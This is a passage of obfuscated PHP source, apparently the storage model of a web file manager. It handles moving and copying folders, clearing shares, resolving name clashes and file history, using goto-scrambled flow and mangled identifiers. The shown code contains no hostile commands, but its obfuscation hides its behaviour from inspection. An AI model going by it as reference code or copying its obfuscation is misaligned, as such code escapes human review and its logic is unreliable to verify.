$this->_childrenListCache[$BŸÌêØÌ½Æ]; foreach ($Aè¤²ĞÎ’ as $C ™±òÖå => $däÀ›ˆÕâ¹) { $c©‹øĞÙÃ[$C ™±òÖå] = $däÀ›ˆÕâ¹; if ($däÀ›ˆÕâ¹[$B–Ïñ›œÍ[411]] == $B–Ïñ›œÍ[97]) { $this->_childrenListAll($C ™±òÖå, $c©‹øĞÙÃ); } } } private function sourceInfoCache($BÕ¬Ò°¦¨é) { if (isset($this->_childrenItemCache[$BÕ¬Ò°¦¨é])) { return $this->_childrenItemCache[$BÕ¬Ò°¦¨é]; } return $this->sourceInfo($BÕ¬Ò°¦¨é); } private function _childrenList($f´»‹ËŸ¼¶) { if (isset($this->_childrenListCache[$f´»‹ËŸ¼¶])) { return $this->_childrenListCache[$f´»‹ËŸ¼¶]; } return $this->_childrenListSelect($f´»‹ËŸ¼¶); } private function _childrenListSelect($c«º±ãÙ¼’) { goto d—Â„Ë¦³; fÖ“½ÅÕ¹: foreach ($EìÊàŠŞâ as $c«º±ãÙ¼’ => $Eï‘©‚§º¬) { $this->_childrenItemCache[$c«º±ãÙ¼’] = $Eï‘©‚§º¬; } return $EìÊàŠŞâ; goto c•À„í£Œá; DäôÔî¹è×: $Aë•µÃ… = $Aë•µÃ… ? $Aë•µÃ… : array(); $EìÊàŠŞâ = array_to_keyvalue($Aë•µÃ…, $cŠ§¹Ø•í[403]); $this->_childrenListCache[$c«º±ãÙ¼’] = $EìÊàŠŞâ; goto fÖ“½ÅÕ¹; d—Â„Ë¦³: $cŠ§¹Ø•í =& $_SERVER[£¶ä½¶¢]; $dæµ³†Œ¢Å = array($cŠ§¹Ø•í[486] => $c«º±ãÙ¼’, $cŠ§¹Ø•í[431] => $this->targetIsDelete); $Aë•µÃ… = $this->where($dæµ³†Œ¢Å)->select(); goto DäôÔî¹è×; c•À„í£Œá: } private function fileNameExistCache($AÛÙÙ…ëµº, $EÎÉÂïÛË×) { $aÓ­±’¢ã =& $_SERVER[£¶ä½¶¢]; $EÎÉÂïÛË× = strtolower($EÎÉÂïÛË×); $F¦´ õåôƒ = $this->_childrenList($AÛÙÙ…ëµº); foreach ($F¦´ õåôƒ as $A»÷„²É·Ü) { if ($EÎÉÂïÛË× == strtolower($A»÷„²É·Ü[$aÓ­±’¢ã[38]])) { return $A»÷„²É·Ü[$aÓ­±’¢ã[403]]; } } return !1; } private function fileNameAutoCache($E’ÔáºŞõË, $C—êˆÊ¡‡ó, $Fô‘Í…Á‹Å, $BèĞ×Ï¦ÂŸ) { $B±°·Ÿ±®È =& $_SERVER[£¶ä½¶¢]; $Dğ¥„ë¯ÌÍ = $this->_childrenList($E’ÔáºŞõË); $Dßê›«³ = array_to_keyvalue($Dğ¥„ë¯ÌÍ, $B±°·Ÿ±®È[43], $B±°·Ÿ±®È[38]); return $this->fileNameAutoGet($Dßê›«³, $C—êˆÊ¡‡ó, $Fô‘Í…Á‹Å, $BèĞ×Ï¦ÂŸ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($FçÛ¦¬ªÎ, $B¤ÈŠ³÷Û, $fØÓ®ô£­· = REPEAT_REPLACE, $e£…ä—É¸ = '') { goto Aç©íÓëÚ¯; cŠˆŸÈœß¤: if ($e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[486]] == $B»ÖÄÅ¶ê[$B¸ÕÈ­á¡»[403]]) { if ($e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[431]] == $B¸ÕÈ­á¡»[97]) { Model($B¸ÕÈ­á¡»[429])->restore(array($FçÛ¦¬ªÎ)); } if (!$e£…ä—É¸ || $e£…ä—É¸ == $e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[38]]) { return $FçÛ¦¬ªÎ; } } $FŸ£ô’¸±Ô = $this->pathInfoMore($FçÛ¦¬ªÎ); if ($this->isParentOf($FçÛ¦¬ªÎ, $B¤ÈŠ³÷Û)) { return !1; } goto fŸÎÚªùõ; Aç©íÓëÚ¯: $B¸ÕÈ­á¡» =& $_SERVER[£¶ä½¶¢]; $e¨ƒê¥ªÀº = $this->sourceInfo($FçÛ¦¬ªÎ); $B»ÖÄÅ¶ê = $this->sourceInfo($B¤ÈŠ³÷Û); goto cŠˆŸÈœß¤; AÕ×ˆ¯ƒ¤°: if ($e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[486]] == $B¤ÈŠ³÷Û && $e£…ä—É¸ != $e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[38]]) { $B‚–»Â¬ù = $this->fileNameExist($B¤ÈŠ³÷Û, $e£…ä—É¸); if ($B‚–»Â¬ù && $e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[411]] == $B¸ÕÈ­á¡»[201]) { goto FºæÖäÁó¶; f³¬ïÈŠÆ©: $this->removeNow($FçÛ¦¬ªÎ, !1); $this->folderSizeReset($B¤ÈŠ³÷Û); Hook::trigger($B¸ÕÈ­á¡»[567], $FŸ£ô’¸±Ô); goto FÌèîÀ§; FÌèîÀ§: return $B‚–»Â¬ù; goto cŞÓ»¯±¤÷; FºæÖäÁó¶: $Fù–“õİá = $this->sourceInfo($B‚–»Â¬ù); $FîÊø‰ğŞ÷ = $this->fileHistory($Fù–“õİá, $e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[455]], $e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[88]]); if (!$FîÊø‰ğŞ÷) { Model($B¸ÕÈ­á¡»[458])->remove($e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[455]]); } goto f³¬ïÈŠÆ©; cŞÓ»¯±¤÷: } } $BŞµÎÂ‡³Å = $e£…ä—É¸ ? $e£…ä—É¸ : $e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[38]]; $this->lockMoveStart($FçÛ¦¬ªÎ); goto fæãÂô•²Ÿ; bÇ·Í†ãó: if ($e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[411]] == $B¸ÕÈ­á¡»[97] && $dèÓÊ‘ğë) { $this->folderSizeResetChildren($fŞÆ……İ½¾); } Model($B¸ÕÈ­á¡»[203])->linkAdd($e—æ­ëÆËí[$B¸ÕÈ­á¡»[537]]); if ($dèÓÊ‘ğë && $e—æ­ëÆËí[$B¸ÕÈ­á¡»[568]]) { $this->removeNow($FçÛ¦¬ªÎ, !1); } goto D­¦ÚÄó‘•; fæãÂô•²Ÿ: $this->lockWriteStart($B¤ÈŠ³÷Û, $BŞµÎÂ‡³Å); $e—æ­ëÆËí = array($B¸ÕÈ­á¡»[537] => array(), $B¸ÕÈ­á¡»[568] => !1); $this->clearShare($FçÛ¦¬ªÎ, $B¤ÈŠ³÷Û); goto dÑ‡›¹—·; F±ª‰µÙ: return $fŞÆ……İ½¾; goto e†“¾³˜ŞÛ; fŸÎÚªùõ: if (!$e¨ƒê¥ªÀº || !$B»ÖÄÅ¶ê || $B»ÖÄÅ¶ê[$B¸ÕÈ­á¡»[411]] != $B¸ÕÈ­á¡»[97]) { return !1; } Hook::trigger($B¸ÕÈ­á¡»[566], $FŸ£ô’¸±Ô); $this->targetIsDelete = intval($e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[431]]); goto AÕ×ˆ¯ƒ¤°; Dô×º‘ô‡ë: $this->updateModifyTime($F‡Çğ½Ã®Œ); Model($B¸ÕÈ­á¡»[541])->eventMove($FçÛ¦¬ªÎ, $e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[486]], $B¤ÈŠ³÷Û); Hook::trigger($B¸ÕÈ­á¡»[567], $FŸ£ô’¸±Ô); goto F±ª‰µÙ; fîªØ­ƒ¾: $this->folderSizeReset($B¤ÈŠ³÷Û); $F‡Çğ½Ã®Œ = array($e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[486]], $B¤ÈŠ³÷Û); if ($e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[411]] == $B¸ÕÈ­á¡»[97]) { $F‡Çğ½Ã®Œ[] = $FçÛ¦¬ªÎ; } goto Dô×º‘ô‡ë; dÑ‡›¹—·: $dèÓÊ‘ğë = $this->fileNameExistCache($B¤ÈŠ³÷Û, $e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[38]]); $fŞÆ……İ½¾ = $this->_move($FçÛ¦¬ªÎ, $B¤ÈŠ³÷Û, $fØÓ®ô£­·, $e—æ­ëÆËí, $e£…ä—É¸); $this->sourceCacheClear(); goto bÇ·Í†ãó; D­¦ÚÄó‘•: $this->lockMoveEnd($FçÛ¦¬ªÎ); $this->lockWriteEnd($B¤ÈŠ³÷Û, $BŞµÎÂ‡³Å); $this->folderSizeReset($e¨ƒê¥ªÀº[$B¸ÕÈ­á¡»[486]]); goto fîªØ­ƒ¾; e†“¾³˜ŞÛ: } private function _move($aöì“’§¹Â, $BÄğŞ‘óô¬, $BğˆÛì‰â˜, &$f„‰åßæ²¹, $Cøáª‰ß = '') { goto f‘ùå‰×¬; fÏôƒ™îæ³: return $fœ¹é¤—Îê; goto B¬é××óÍ£; e‹«¯åø‘‡: $aŒ¸º«ÆŞŠ = $Cøáª‰ß ? $Cøáª‰ß : $aï£¬ÌÃ[$Fº¨½½¥…»[38]]; $AïŠŠÔ°Ïà = $this->fileNameExistCache($BÄğŞ‘óô¬, $aŒ¸º«ÆŞŠ); $this->lockMoveStart($aöì“’§¹Â); goto bá³‚Œùå; bá³‚Œùå: $this->lockWriteStart($BÄğŞ‘óô¬, $aŒ¸º«ÆŞŠ); if (!$AïŠŠÔ°Ïà) { return $this->_moveForce($aöì“’§¹Â, $BÄğŞ‘óô¬, $aŒ¸º«ÆŞŠ); } $fœ¹é¤—Îê = $AïŠŠÔ°Ïà; goto bï™òƒ®›„; bï™òƒ®›„: $E´‹²ƒ†à = !1; if ($C±‹Äª·¾‘) { if ($BğˆÛì‰â˜ == REPEAT_RENAME_FOLDER) { $aŒ¸º«ÆŞŠ = $this->fileNameAuto($BÄğŞ‘óô¬, $aŒ¸º«ÆŞŠ, $BğˆÛì‰â˜, $C±‹Äª·¾‘); $fœ¹é¤—Îê = $this->_moveForce($aöì“’§¹Â, $BÄğŞ‘óô¬, $aŒ¸º«ÆŞŠ); } else { if ($BğˆÛì‰â˜ == REPEAT_RENAME_FOLDER) { $BğˆÛì‰â˜ = REPEAT_RENAME; } $D‹äÄÑÙ› = $this->_childrenListSelect($aöì“’§¹Â); foreach ($D‹äÄÑÙ› as $f¥øäøó¸¢) { $this->_move($f¥øäøó¸¢[$Fº¨½½¥…»[403]], $AïŠŠÔ°Ïà, $BğˆÛì‰â˜, $f„‰åßæ²¹); } $E´‹²ƒ†à = !0; } } else { if ($BğˆÛì‰â˜ == REPEAT_SKIP) { $E´‹²ƒ†à = !0; } else { if ($BğˆÛì‰â˜ == REPEAT_RENAME || $BğˆÛì‰â˜ == REPEAT_RENAME_FOLDER) { $aŒ¸º«ÆŞŠ = $this->fileNameAuto($BÄğŞ‘óô¬, $aŒ¸º«ÆŞŠ, $BğˆÛì‰â˜, $C±‹Äª·¾‘); $fœ¹é¤—Îê = $this->_moveForce($aöì“’§¹Â, $BÄğŞ‘óô¬, $aŒ¸º«ÆŞŠ); } else { if ($BğˆÛì‰â˜ == REPEAT_REPLACE) { $E£¡ÉÈß¢• = $this->sourceInfoCache($AïŠŠÔ°Ïà); $AÒ‚¬å‹•­ = $this->fileHistory($E£¡ÉÈß¢•, $aï£¬ÌÃ[$Fº¨½½¥…»[455]], $aï£¬ÌÃ[$Fº¨½½¥…»[88]]); if ($AÒ‚¬å‹•­) { $f„‰åßæ²¹[$Fº¨½½¥…»[537]][] = $aï£¬ÌÃ[$Fº¨½½¥…»[455]]; } else { $E´‹²ƒ†à = !0; } } } } } if ($E´‹²ƒ†à && !$f„‰åßæ²¹[$Fº¨½½¥…»[568]]) { $f„‰åßæ²¹[$Fº¨½½¥…»[568]] = !0; } goto fÏôƒ™îæ³; f‘ùå‰×¬: $Fº¨½½¥…» =& $_SERVER[£¶ä½¶¢]; $aï£¬ÌÃ = $this->sourceInfo($aöì“’§¹Â); $C±‹Äª·¾‘ = $aï£¬ÌÃ[$Fº¨½½¥…»[411]] == $Fº¨½½¥…»[97]; goto e‹«¯åø‘‡; B¬é××óÍ£: } private function _moveForce($dêçç‚ßæÏ, $B·»õñ±Ğ°, $e¾Ş©Õ”Ñ¿) { goto b‡İÄ¯ŒÉÙ; CÅ‰³ŒöÛ: $cƒ†°´Ù“ˆ = $bÃ£¶£Ğ«è[$CÆ¬Ş¾òà•[411]] == $CÆ¬Ş¾òà•[97]; $EÚœ”•ºÏ˜ = array($CÆ¬Ş¾òà•[402] => $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[403]], $CÆ¬Ş¾òà•[561] => $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[495]] . $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[403]] . $CÆ¬Ş¾òà•[57], $CÆ¬Ş¾òà•[557] => $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[412]], $CÆ¬Ş¾òà•[558] => $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[492]], $CÆ¬Ş¾òà•[560] => USER_ID, $CÆ¬Ş¾òà•[421] => $e¾Ş©Õ”Ñ¿); $açÌ‹Ş£Ó‚ = $bÃ£¶£Ğ«è[$CÆ¬Ş¾òà•[412]] == SourceModel::TYPE_GROUP && $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[412]] == SourceModel::TYPE_GROUP && $bÃ£¶£Ğ«è[$CÆ¬Ş¾òà•[492]] == $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[492]]; goto Fù«‚‚÷’; aŒ¤òĞéêõ: if ($cƒ†°´Ù“ˆ) { $B»ô‡ÀÏšø = array($CÆ¬Ş¾òà•[561] => array($CÆ¬Ş¾òà•[520], $bÃ£¶£Ğ«è[$CÆ¬Ş¾òà•[495]] . $bÃ£¶£Ğ«è[$CÆ¬Ş¾òà•[403]] . $CÆ¬Ş¾òà•[521])); $BéÁÓÎàµ° = $bÃ£¶£Ğ«è[$CÆ¬Ş¾òà•[495]] . $bÃ£¶£Ğ«è[$CÆ¬Ş¾òà•[403]] . $CÆ¬Ş¾òà•[57]; $Dõ¯ÊÑÊ„Å = $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[495]] . $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[403]] . $CÆ¬Ş¾òà•[57] . $bÃ£¶£Ğ«è[$CÆ¬Ş¾òà•[403]] . $CÆ¬Ş¾òà•[57]; $bï°À©‡¬• = array($CÆ¬Ş¾òà•[561] => array($CÆ¬Ş¾òà•[569], "\162\x65\160\x6c\141\x63\x65\x28\x70\141\x72\x65\156\x74\x4c\x65\x76\145\x6c\x2c\47{$BéÁÓÎàµ°}\x27\54\x27{$Dõ¯ÊÑÊ„Å}\47\51"), $CÆ¬Ş¾òà•[557] => $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[412]], $CÆ¬Ş¾òà•[558] => $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[492]]); if ($fÀ¶ŠÙÓİ¹) { $bï°À©‡¬•[$CÆ¬Ş¾òà•[430]] = 0; } $this->where($B»ô‡ÀÏšø)->data($bï°À©‡¬•)->save(); } $this->where(array($CÆ¬Ş¾òà•[418] => $dêçç‚ßæÏ))->data($EÚœ”•ºÏ˜)->save(); return $dêçç‚ßæÏ; goto FŠ™ğéß¢ª; Fù«‚‚÷’: if (!$açÌ‹Ş£Ó‚ && $this->moveClearAuth) { Model($CÆ¬Ş¾òà•[490])->authClear($dêçç‚ßæÏ); } $fÀ¶ŠÙÓİ¹ = $bÃ£¶£Ğ«è[$CÆ¬Ş¾òà•[431]] == $CÆ¬Ş¾òà•[97] && $CÌñÛáâ´ô[$CÆ¬Ş¾òà•[431]] != $CÆ¬Ş¾òà•[97]; if ($fÀ¶ŠÙÓİ¹) { $EÚœ”•ºÏ˜[$CÆ¬Ş¾òà•[430]] = 0; } goto aŒ¤òĞéêõ; b‡İÄ¯ŒÉÙ: $CÆ¬Ş¾òà• =& $_SERVER[£¶ä½¶¢]; $bÃ£¶£Ğ«è = $this->sourceInfo($dêçç‚ßæÏ); $CÌñÛáâ´ô = $this->sourceInfo($B·»õñ±Ğ°); goto CÅ‰³ŒöÛ; FŠ™ğéß¢ª: } private function clearShare($aÏ…›ó×¦î, $Eîµí“î‚) { goto BŒ…Ã„; BÀ‚ÚŒ˜™ˆ: if (!$dÆò˜¨¯×í) { return; } $Eôˆ‘ÅÁ«Ç = array($bÛğŸñÃŸ…[403] => array($bÛğŸñÃŸ…[17], $dÆò˜¨¯×í), $bÛğŸñÃŸ…[483] => 1); $b‘ªÏÜ×íØ = Model($bÛğŸñÃŸ…[571])->field($bÛğŸñÃŸ…[476])->where($Eôˆ‘ÅÁ«Ç)->select(); goto A·¸§ÊãÔ; A·¸§ÊãÔ: if (!$b‘ªÏÜ×íØ) { return; } $b‘ªÏÜ×íØ = array_to_keyvalue($b‘ªÏÜ×íØ, $bÛğŸñÃŸ…[43], $bÛğŸñÃŸ…[476]); $Eôˆ‘ÅÁ«Ç = array($bÛğŸñÃŸ…[476] => array($bÛğŸñÃŸ…[17], $b‘ªÏÜ×íØ)); goto DóÚ‹õ”İŒ; DóÚ‹õ”İŒ: Model($bÛğŸñÃŸ…[571])->where($Eôˆ‘ÅÁ«Ç)->save(array($bÛğŸñÃŸ…[483] => 0)); Model($bÛğŸñÃŸ…[572])->where($Eôˆ‘ÅÁ«Ç)->delete(); goto C‘ˆ›ì·åŒ; c²ªé™°Ü: if ($B”¸§Ø‚Ï¹[$bÛğŸñÃŸ…[492]] == $C¬Ë´¬­Ñã[$bÛğŸñÃŸ…[492]] && $B”¸§Ø‚Ï¹[$bÛğŸñÃŸ…[412]] == $bÛğŸñÃŸ…[570]) { return; } $Eôˆ‘ÅÁ«Ç = array($bÛğŸñÃŸ…[495] => array($bÛğŸñÃŸ…[520], $B”¸§Ø‚Ï¹[$bÛğŸñÃŸ…[495]] . $aÏ…›ó×¦î . $bÛğŸñÃŸ…[521])); $dÆò˜¨¯×í = $this->field($bÛğŸñÃŸ…[418])->where($Eôˆ‘ÅÁ«Ç)->getField($bÛğŸñÃŸ…[403], !0); goto BÀ‚ÚŒ˜™ˆ; BŒ…Ã„: $bÛğŸñÃŸ… =& $_SERVER[£¶ä½¶¢]; $B”¸§Ø‚Ï¹ = $this->sourceInfo($aÏ…›ó×¦î); $C¬Ë´¬­Ñã = $this->sourceInfo($Eîµí“î‚); goto c²ªé™°Ü; C‘ˆ›ì·åŒ: } public function copyFolderFromIO($eùĞÀ¿‹ï½, $d²ï™‡á¢, $f‘Á³¢°ËŠ, $f‰ôÖ°éÜ™, $c™ÔàÒÔÉš, $Fñ·‹°†¹½ = false) { goto C±·”Ù‹ßë; c§ò”ˆ¿ëÈ: if ($aõİ¼º Şµ) { $this->_childrenAllMake($aõİ¼º Şµ); } Hook::trigger($E·’İ˜Ø‘¦[574]); $this->_copyChildTo($eùĞÀ¿‹ï½, $d²ï™‡á¢, $e×¥ôø½’š, $f‰ôÖ°éÜ™, $Fµ¤™‘êïä, $c™ÔàÒÔÉš); goto cÏÍçİ„ŒÍ; Bë¥°ãå¾è: $this->updateModifyTime($f‘Á³¢°ËŠ); return $e×¥ôø½’š; goto b¦ˆÈ’‡Û; C±·”Ù‹ßë: $E·’İ˜Ø‘¦ =& $_SERVER[£¶ä½¶¢]; $Fµ¤™‘êïä = array($E·’İ˜Ø‘¦[538] => array(), $E·’İ˜Ø‘¦[539] => array(), $E·’İ˜Ø‘¦[537] => array(), $E·’İ˜Ø‘¦[573] => array()); $c…¦æòÏØ» = $Fñ·‹°†¹½ ? $Fñ·‹°†¹½ : $eùĞÀ¿‹ï½->pathThis($d²ï™‡á¢); goto aæİµœ‚çš; aæİµœ‚çš: $aõİ¼º Şµ = $this->fileNameExist($f‘Á³¢°ËŠ, $c…¦æòÏØ»); $e×¥ôø½’š = $this->mkdir($f‘Á³¢°ËŠ, $c…¦æòÏØ», $f‰ôÖ°éÜ™); if (!$aõİ¼º Şµ || $f‰ôÖ°éÜ™ == REPEAT_RENAME_FOLDER) { $f‰ôÖ°éÜ™ = !1; } goto c§ò”ˆ¿ëÈ; cÏÍçİ„ŒÍ: Hook::trigger($E·’İ˜Ø‘¦[575]); if ($e×¥ôø½’š) { $this->folderSizeResetChildren($e×¥ôø½’š); } $this->_childrenListClear(); goto AŠÅ‹Üê‚; b” „â½·Å: Model($E·’İ˜Ø‘¦[458])->linkAdd($Fµ¤™‘êïä[$E·’İ˜Ø‘¦[537]]); Model($E·’İ˜Ø‘¦[458])->remove($Fµ¤™‘êïä[$E·’İ˜Ø‘¦[573]]); $this->folderSizeReset($f‘Á³¢°ËŠ); goto Bë¥°ãå¾è; AŠÅ‹Üê‚: Model($E·’İ˜Ø‘¦[540])->addAll($Fµ¤™‘êïä[$E·’İ˜Ø‘¦[538]], array(), !0); Model($E·’İ˜Ø‘¦[541])->eventCopy($e×¥ôø½’š); $this->saveAll($Fµ¤™‘êïä[$E·’İ˜Ø‘¦[539]]); goto b” „â½·Å; b¦ˆÈ’‡Û: } private function _copyChildTo($CÑÏß†ƒÅã, $E¦äÄ¯ì , $A‹ÄîÙ¸•, $b§ØµŸ­³›, &$d‚¡‡Ï‰š, $dºÍÆ¨¨óó) { goto ešù©®Ò§“; B¦èãÊ¿Ì¤: $f×Ğ«Ã¬¯ = $f×Ğ«Ã¬¯ ? $f×Ğ«Ã¬¯ : array($dĞéåİ‚ë„[84] => array(), $dĞéåİ‚ë„[85] => array()); $d½î˜¿÷¹ò = array_merge($f×Ğ«Ã¬¯[$dĞéåİ‚ë„[84]], $f×Ğ«Ã¬¯[$dĞéåİ‚ë„[85]]); $a‘ºäÊÄ˜Â = $this->_addFiles($CÑÏß†ƒÅã, $f×Ğ«Ã¬¯[$dĞéåİ‚ë„[84]], $dºÍÆ¨¨óó); goto Eå½İÑ£¸ñ; ešù©®Ò§“: $dĞéåİ‚ë„ =& $_SERVER[£¶ä½¶¢]; $aë¯Õ­ÖÓº = $this->sourceInfoCache($A‹ÄîÙ¸•); $f×Ğ«Ã¬¯ = $CÑÏß†ƒÅã->listPath($E¦äÄ¯ì ); goto B¦èãÊ¿Ì¤; d’ÒÙŠ¹Ê: if (!empty($F‡‚ƒ­ƒ·)) { $this->addAll($F‡‚ƒ­ƒ·); $this->_childrenListSelect($A‹ÄîÙ¸•); } $f£Ÿ“´˜ãµ = $this->_childrenList($A‹ÄîÙ¸•); $f£Ÿ“´˜ãµ = array_to_keyvalue($f£Ÿ“´˜ãµ, $dĞéåİ‚ë„[38]); goto B±Â ŠÚÏš; Eå½İÑ£¸ñ: $F‡‚ƒ­ƒ· = array(); foreach ($d½î˜¿÷¹ò as &$C…™Ö‚ñÓé) { goto fÁñ˜ùñ¸¬; dÂğ©—Õ±½: $C…™Ö‚ñÓé[$dĞéåİ‚ë„[88]] = _get($C…™Ö‚ñÓé, $dĞéåİ‚ë„[88], 0); $C…™Ö‚ñÓé[$dĞéåİ‚ë„[455]] = _get($C…™Ö‚ñÓé, $dĞéåİ‚ë„[455], 0); if (!isset($C…™Ö‚ñÓé[$dĞéåİ‚ë„[576]]) && $C…™Ö‚ñÓé[$dĞéåİ‚ë„[455]]) { $d‚¡‡Ï‰š[$dĞéåİ‚ë„[573]][] = $C…™Ö‚ñÓé[$dĞéåİ‚ë„[455]]; } goto FÁ‰Ú›ƒõÜ; fÁñ˜ùñ¸¬: if (isset($a‘ºäÊÄ˜Â[$C…™Ö‚ñÓé[$dĞéåİ‚ë„[38]]])) { $C…™Ö‚ñÓé = $a‘ºäÊÄ˜Â[$C…™Ö‚ñÓé[$dĞéåİ‚ë„[38]]]; } $C…™Ö‚ñÓé[$dĞéåİ‚ë„[411]] = $C…™Ö‚ñÓé[$dĞéåİ‚ë„[39]] == $dĞéåİ‚ë„[87]; $C…™Ö‚ñÓé[$dĞéåİ‚ë„[413]] = _get($C…™Ö‚ñÓé, $dĞéåİ‚ë„[178], $dĞéåİ‚ë„[43]); goto dÂğ©—Õ±½; FÁ‰Ú›ƒõÜ: if ($b§ØµŸ­³›) { $A¿ºŒÂõä = $this->fileNameExistCache($A‹ÄîÙ¸•, $C…™Ö‚ñÓé[$dĞéåİ‚ë„[38]]); if ($A¿ºŒÂõä) { if ($C…™Ö‚ñÓé[$dĞéåİ‚ë„[411]] || $b§ØµŸ­³› == REPEAT_SKIP) { continue; } if ($b§ØµŸ­³› == REPEAT_REPLACE) { $b¢„ÃÕ›™Ò = $this->sourceInfoCache($A¿ºŒÂõä); $f½ïÀæĞÛ = $this->fileHistory($b¢„ÃÕ›™Ò, $C…™Ö‚ñÓé[$dĞéåİ‚ë„[455]], $C…™Ö‚ñÓé[$dĞéåİ‚ë„[88]]); if ($f½ïÀæĞÛ) { $d‚¡‡Ï‰š[$dĞéåİ‚ë„[537]][] = $C…™Ö‚ñÓé[$dĞéåİ‚ë„[455]]; } continue; } else { if ($b§ØµŸ­³› == REPEAT_RENAME) { $C…™Ö‚ñÓé[$dĞéåİ‚ë„[38]] = $this->fileNameAutoCache($A‹ÄîÙ¸•, $C…™Ö‚ñÓé[$dĞéåİ‚ë„[38]], $b§ØµŸ­³›, !1); } } } } if (!$C…™Ö‚ñÓé[$dĞéåİ‚ë„[411]] && $C…™Ö‚ñÓé[$dĞéåİ‚ë„[455]]) { $d‚¡‡Ï‰š[$dĞéåİ‚ë„[537]][] = $C…™Ö‚ñÓé[$dĞéåİ‚ë„[455]]; } $F‡‚ƒ­ƒ·[] = $this->_makeItemData($C…™Ö‚ñÓé, $aë¯Õ­ÖÓº, $C…™Ö‚ñÓé[$dĞéåİ‚ë„[38]]); goto E×íññª³Ñ; E×íññª³Ñ: } unset($C…™Ö‚ñÓé); goto d’ÒÙŠ¹Ê; B±Â ŠÚÏš: foreach ($d½î˜¿÷¹ò as $C…™Ö‚ñÓé) { $b¢„ÃÕ›™Ò = $f£Ÿ“´˜ãµ[$C…™Ö‚ñÓé[$dĞéåİ‚ë„[38]]]; $dÍ…¹”ë‚× = $b¢„ÃÕ›™Ò[$dĞéåİ‚ë„[403]]; $this->_copyApplyMeta($b¢„ÃÕ›™Ò, $d‚¡‡Ï‰š); if ($C…™Ö‚ñÓé[$dĞéåİ‚ë„[39]] == $dĞéåİ‚ë„[87]) { $C…™Ö‚ñÓé[$dĞéåİ‚ë„[86]] = $CÑÏß†ƒÅã->getPathInner($C…™Ö‚ñÓé[$dĞéåİ‚ë„[86]]); $this->_copyChildTo($CÑÏß†ƒÅã, $C…™Ö‚ñÓé[$dĞéåİ‚ë„[86]], $dÍ…¹”ë‚×, $b§ØµŸ­³›, $d‚¡‡Ï‰š, $dºÍÆ¨¨óó); } } goto F©Ë•„¶Ïë; F©Ë•„¶Ïë: } private function _addFiles($bÛŞå½™ÀØ, $Bˆ¢Ï‚æù, $b½«Û²Ç‡Æ) { goto FòĞÕœ¤–; FòĞÕœ¤–: $c„·Ø¿¬ =& $_SERVER[£¶ä½¶¢]; if (!$Bˆ¢Ï‚æù || count($Bˆ¢Ï‚æù) == 0) { return array(); } $f°ÃÉ…˜Ò = array(); goto FƒÔ÷í£Íˆ; d§óÏóˆó…: $a†Œ‹éË¤’->addAll($aÜ­£‘¸ğ®); $eÌóà „Ç· = array($c„·Ø¿¬[180] => array($c„·Ø¿¬[17], array_keys($f°ÃÉ…˜Ò))); $e³ŒÂöÓ¹­ = $a†Œ‹éË¤’->where($eÌóà „Ç·)->select(); goto b‡×•‹£ÙÀ; FƒÔ÷í£Íˆ: foreach ($Bˆ¢Ï‚æù as &$B—Éò™—ò—) { goto f¯³øò¡Å¡; f¯³øò¡Å¡: Hook::trigger($c„·Ø¿¬[577], $B—Éò™—ò—); $B—Éò™—ò—[$c„·Ø¿¬[86]] = $bÛŞå½™ÀØ->getPathInner($B—Éò™—ò—[$c„·Ø¿¬[86]]); $E‰ƒ‚–«Î¤ = $bÛŞå½™ÀØ->hashSimple($B—Éò™—ò—[$c„·Ø¿¬[86]]); goto d®¹ã¢ğïØ; d¸›Ò³Œµ·: $B—Éò™—ò—[$c„·Ø¿¬[180]] = $fÔòÀùîŸ; Hook::trigger($c„·Ø¿¬[578], $B—Éò™—ò—); $f°ÃÉ…˜Ò[$fÔòÀùîŸ][] =& $B—Éò™—ò—; goto fÃ µˆàŠ; d®¹ã¢ğïØ: $fÔòÀùîŸ = $bÛŞå½™ÀØ->hashMd5($B—Éò™—ò—[$c„·Ø¿¬[86]]); if (strlen($fÔòÀùîŸ) > 10 && !isset($f°ÃÉ…˜Ò[$fÔòÀùîŸ])) { $f°ÃÉ…˜Ò[$fÔòÀùîŸ] = array(); } $B—Éò™—ò—[$c„·Ø¿¬[181]] = $E‰ƒ‚–«Î¤; goto d¸›Ò³Œµ·; fÃ µˆàŠ: if (count($f°ÃÉ…˜Ò[$fÔòÀùîŸ]) > 1) { $B—Éò™—ò—[$c„·Ø¿¬[576]] = !0; } goto bæ…ÊÚ•Î˜; bæ…ÊÚ•Î˜: } unset($B—Éò™—ò—); $eÌóà „Ç· = array($c„·Ø¿¬[180] => array($c„·Ø¿¬[17], array_keys($f°ÃÉ…˜Ò))); goto eÜöÛø†õ; b‡×•‹£ÙÀ: $e³ŒÂöÓ¹­ = $e³ŒÂöÓ¹­ ? $e³ŒÂöÓ¹­ : array(); foreach ($e³ŒÂöÓ¹­ as $Eã„¶‡”³Š) { if (!isset($f°ÃÉ…˜Ò[$Eã„¶‡”³Š[$c„·Ø¿¬[180]]])) { continue; } $CŠ©Êß–ˆñ =& 